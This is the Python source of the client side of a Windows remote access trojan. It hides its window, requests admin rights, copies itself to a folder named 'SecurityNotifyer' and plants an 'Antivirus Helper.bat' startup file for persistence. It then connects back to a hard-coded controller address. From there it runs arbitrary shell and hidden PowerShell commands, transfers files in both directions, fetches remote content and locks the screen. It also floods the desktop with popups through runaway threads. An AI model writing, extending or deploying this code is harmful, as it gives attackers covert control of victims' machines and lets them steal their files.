# client
import socket  # networking
import subprocess  # commandline
import os
import base64  # base64 encoding/decoding for networking
from threading import Thread  # threading for spam module
import shutil  # copy file in startup
import ctypes   # get admin rights
import sys  #get admin rights
from time import sleep
import platform #get info over computer
import time

try:
    from tkinter import Tk  # Python 3
    tkinter_installed = True
except:
    tkinter_installed = False

host = '192.168.178.44'  # 127.0.0.1 - 192.168.178.44
port = 12345


def send(report, report_error):
    print(report)
    print(report_error)
    report_bytes = report.encode(encoding='ascii', errors='replace')
    report_error_bytes = report_error.encode(encoding='ascii', errors='replace')

    report_b64_bytes = base64.b64encode(report_bytes)
    report_error_b64_bytes = base64.b64encode(report_error_bytes)

    report_b64_string = report_b64_bytes.decode(encoding='ascii', errors='backslashreplace')
    report_error_b64_string = report_error_b64_bytes.decode(encoding='ascii', errors='backslashreplace')

    s.sendall(report_b64_string.encode())
    s.sendall(report_error_b64_string.encode())


def persistance():
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if not (__file__.find("C:\Program Files (x86)\SecurityNotifyer")) == 0 or is_admin():
        if is_admin():

            path = "C:\Program Files (x86)\SecurityNotifyer"
            startup = "C:\\Users\\" + os.getlogin() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            directory = os.getcwd()
            if not os.path.exists(path):  # create folder if not exists
                os.mkdir(path)
            #if not os.path.exists(path + "\\" + os.path.basename(__file__)):
            src = __file__  # copy to folder if not exists
            shutil.copy(src, path)

            os.chdir(startup)  # go to startup
            with open('Antivirus Helper.bat', 'w') as f:  # create batch to open script on startup
                if __file__.find(".py") >= 0:
                    f.write("@echo off\ncd " + path + "\npython " + os.path.basename(__file__) + " ")
                elif __file__.find(".pyw") >= 0:
                    f.write("@echo off\ncd " + path + "\npythonw " + os.path.basename(__file__) + " ")
                else:
                    f.write("@echo off\ncd " + path + "\nstart " + os.path.basename(__file__) + " ")

            os.chdir(directory)

        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None ,1)  # https://www.codegrepper.com/code-examples/python/get+admin+permission+python
            exit()


def say(data):
    message_cmd = "PowerShell -w hidden -Command \"Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('" + (
    data.partition(' ')[2]) + "');\""  # PowerShell -Command "Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('hello');"
    info = subprocess.STARTUPINFO()
    info.dwFlags = 1
    info.wShowWindow = 0
    subprocess.Popen('cmd /c' + message_cmd)


def message(data):
    info = subprocess.STARTUPINFO()
    info.dwFlags = 1
    info.wShowWindow = 0
    message_cmd = "mshta \"javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( '" + (data.partition(' ')[2]) + "', 0 , '', 64 );close()\""
    # mshta "javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( 'Message!', 10, 'Title!', 64 );close()"
    subprocess.Popen('cmd /c' + message_cmd)


def wallpaper(data):
    info = subprocess.STARTUPINFO()
    info.dwFlags = 1
    info.wShowWindow = 0
    message_cmd = "cmd /C \"start  powershell -w hidden iwr -Uri " + (data.partition(' ')[2]) + " -OutFile c:\windows\\temp\\b.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\\temp\\b.jpg';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59)\""
    subprocess.Popen('cmd /c' + message_cmd)


def thread_spam():
    while True:
        spam_thread = Thread(target=thread_spam)
        spam_thread.start()
        message_cmd = "mshta \"javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( 'Error404', 0 , '', 64 );close()\""
        info = subprocess.STARTUPINFO()
        info.dwFlags = 1
        info.wShowWindow = 0
        subprocess.Popen('cmd /c' + message_cmd)


def checkHostWindows():
    if os.name == "nt":
        print('windows detected')
    else:
        print('Please use Windows')
        input("end")
        exit(0)


def lock():
    message_cmd = "rundll32.exe user32.dll, LockWorkStation"
    info = subprocess.STARTUPINFO()
    info.dwFlags = 1
    info.wShowWindow = 0
    subprocess.Popen('cmd /c' + message_cmd)


def cd(data):
    os.chdir((data.partition(' ')[2]))
    report = os.getcwd()
    report_error = ""
    send(report, report_error)

def play(data):
    message_cmd = "cmd /C \"start powershell -w Hidden iwr -Uri " + (data.partition(' ')[2]) + " -OutFile c:\windows\\temp\\b.wav; (New-Object Media.SoundPlayer \"c:\windows\\temp\\b.wav\").PlaySync();"
    info = subprocess.STARTUPINFO()
    info.dwFlags = 1
    info.wShowWindow = 0
    subprocess.Popen('cmd /c' + message_cmd)
# https://www.soundjay.com/human/man-screaming-01.wav

def powershell(data):
    info = subprocess.STARTUPINFO()
    info.dwFlags = 1
    info.wShowWindow = 0
    op = subprocess.Popen("powershell -w Hidden " + (data.partition(' ')[2]) , shell=True,
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE)

    report = op.stdout.read().decode(encoding='ascii', errors='replace')
    report_error = op.stderr.read().decode(encoding='ascii', errors='replace')

    if report != "":
        report = report + "\n" + (os.getcwd()).replace("\\", "/")

    if report_error != "":
        report_error = report_error + "\n" + (os.getcwd()).replace("\\", "/")

    send(report, report_error)


def hide():
    message_cmd = "powershell -w Hidden exit"    #-WindowStyle Hidden
    info = subprocess.STARTUPINFO()
    info.dwFlags = 1
    info.wShowWindow = 0
    subprocess.Popen('cmd /c' + message_cmd)
    sleep(1)


def info():
    uname = platform.uname()
    info = (f'{"=" * 40} System Information {"=" * 40}\n Node Name: {uname.node}\n IP: {ip()}\n System: {uname.system}\n Release: {uname.release}\n Version: {uname.version}\n Machine: {uname.machine}\n Processor: {uname.processor}\n Tkinter: {tkinter_installed}')
    return(info)


def ip():
    ip = get('https://api.ipify.org').text
    return(ip)


def upload():
    file = s.recv(5000)
    file_text = s.recv(1024)
    f = open(file.decode(), "wb")
    while not file_text == (b"end1234"):
        f.write(file_text)
        file_text = s.recv(1024)
    f.close()
    print("finished")

def download(data):
    file = os.path.basename(data.partition(' ')[2])
    f = open(data.partition(' ')[2], "rb")
    lines = f.read(1024)
    time.sleep(0.5)
    s.sendall(file.encode())
    time.sleep(0.5)
    while lines:
        s.send(lines)
        lines = f.read(1024)
    f.close()
    time.sleep(0.5)
    s.sendall(b"end1234")
    print("finished upload")


#######################################################################################################################

checkHostWindows()
hide()
persistance()

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Established connection to: ", host, ":", port)
        s.connect((host, port))
        send(info(), "")

        while True:
            data_b64 = s.recv(5000)
            data_b64_bytes = data_b64  # .encode("ascii")
            data_bytes = base64.b64decode(data_b64_bytes)
            data = data_bytes.decode("ascii")

            if data != None:
                print("Executed: ", data)

                if data.find("message") == 0:
                    message(data)
                    report = "Messagebox executed"
                    report_error = ""
                    send(report, report_error)

                elif data.find("say") == 0:
                    speech = Thread(target=say(data), args=())
                    speech.start()
                    report = "Speech executed"
                    report_error = ""
                    send(report, report_error)

                elif data.find("spam") == 0:
                    spam = Thread(target=thread_spam, args=())
                    spam.start()
                    report = "spam in progress"
                    report_error = ""
                    send(report, report_error)

                elif data.find("wallpaper") == 0:
                    wallpaper(data)
                    report = "wallpaper changed"
                    report_error = ""
                    send(report, report_error)

                elif data.find("lock") == 0:
                    lock()
                    report = "Computer locked"
                    report_error = ""
                    send(report, report_error)

                elif data.find("upload") == 0:
                    upload()

                elif data.find("download") == 0:
                    download(data)

                elif data.find("info") == 0:
                    send(info(), "")

                elif data.find("cd") == 0:
                    if data == "cd" or data == "cd ":
                        report = ""
                        report_error = (os.getcwd())
                        send(report, report_error)
                    else:
                        cd(data)

                elif data.find("play") == 0:
                    play(data)
                    report = "played sound"
                    report_error = ""
                    send(report, report_error)

                elif data.find("p") == 0:
                    powershell(data)

                elif data.find("ip"):
                    try:
                        from requests import get  # make web request to get ip
                        send(ip(), "")
                    except:
                        send("request module not installed", "")

                else:

                    op = subprocess.Popen(data, shell=True,
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE)

                    report = op.stdout.read().decode(encoding='ascii', errors='replace')
                    report_error = op.stderr.read().decode(encoding='ascii', errors='replace')

                    if report != "":
                        report = report + "\n" + (os.getcwd()).replace("\\", "/")

                    if report_error != "":
                        report_error = report_error + "\n" + (os.getcwd()).replace("\\", "/")

                    send(report, report_error)

    except:
        print("Disconnected")
